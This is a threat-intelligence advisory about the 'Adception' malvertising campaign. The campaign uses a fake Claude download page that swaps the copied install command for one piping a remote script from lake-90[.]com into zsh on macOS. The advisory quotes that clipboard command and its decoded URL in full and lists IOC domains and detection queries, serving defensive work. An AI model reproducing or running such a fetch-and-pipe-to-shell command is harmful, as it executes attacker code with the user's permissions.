# Adception InstallFix Campaign Fakes Claude Download Page and Pipes Remote Script Into macOS zsh

**Date:** 2026-10-14
**Tags:** phishing, malware, malicious-tool

## Executive Summary

A malvertising campaign tracked as Adception (Threadlinqs TL-2026-3410) sends macOS users searching for 'claude mac' to a fake Claude download page at claude-desk-code[.]com, whose copy button silently replaces the legitimate install command with one that pipes a remote script from lake-90[.]com straight into zsh. Push Security detected the campaign in a customer environment and named the redirect technique Adception, and BleepingComputer and NSFOCUS covered it. Because the final payload was never recovered, the malware family, persistence, and command and control for this specific macOS chain remain unknown.

## Campaign Summary

| Field | Detail |
|-------|--------|
| Campaign / Malware | Adception |
| Attribution | Unknown (confidence: none) |
| Target | macOS users searching for Claude installation instructions |
| Vector | Google Ads and Bing click tracking redirect to a fake Claude download page with clipboard swapping InstallFix lure |
| Status | active |
| First Observed | 2026-10-09 |

## Detailed Findings

According to Threadlinqs, the campaign abuses Google Ads, a Bing click tracking redirect, and a compromised South American retailer site to route users searching for 'claude mac' to a fake Claude download page at claude-desk-code[.]com. The page shows the legitimate install command but copies a different command to the clipboard that pipes a remote script from lake-90[.]com into zsh. Threadlinqs reported the copy button writes echo "Downloading Claude: https://claude.ai/install.sh" && curl -s $(echo " " | openssl base64 -d -A) | zsh, where the base64 decodes to https://lake-90[.]com/curl/inhgup9a/a90fkbqdg8d0mus64oh8dw.dat, a script downloaded silently and piped into zsh with the victim's user level permissions. Push Security, which detected the campaign in a customer environment, named the redirect technique Adception in a 2026-10-09 report, and BleepingComputer reported it the same day while NSFOCUS covered it on 2026-10-13 tracking the toolchain as AcSig. Threadlinqs noted the final payload was not recovered by any source, so the malware family, persistence, and command and control for this macOS chain are unknown, and Push Security lists seven further lure domains in the same InstallFix cluster. Separately reported InstallFix campaigns against Claude Code delivered Amatera Stealer (BleepingComputer, 2026-03-06) and a RedLine linked Windows chain (Trend Micro, 2026-05-05), which are related context and not confirmed to share infrastructure with this campaign.

## MITRE ATT&CK Mapping

| Technique | ID | Context |
|-----------|-----|---------|
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Clipboard swapped command pipes a remote script into zsh on macOS |
| Masquerading | T1036 | Fake Claude download page impersonates Anthropic installation instructions |

## IOCs

### Domains

```
claude-desk-code.com
lake-90.com
```

### Full URL Paths

_IOCs from Threadlinqs TL-2026-3410. Push Security reports seven further lure domains in the same InstallFix cluster._

### Splunk Format

```
"claude-desk-code.com" OR "lake-90.com"
```

### Affected Platforms

```
Apple macOS
```

## Detection Recommendations

Alert on shell pipelines that decode base64 and pipe the result into zsh or sh, and on outbound connections to lake-90[.]com and the wider InstallFix lure cluster. Block sponsored search results that redirect through bing.com tracking links to lookalike install pages, and educate macOS users to verify install commands against the official Anthropic documentation rather than pasting clipboard content from a download page.

## References

- [Threadlinqs] Fake Claude Installation Page Delivers Malware (TL-2026-3410) (2026-10-13) — https://intel.threadlinqs.com/threat/TL-2026-3410
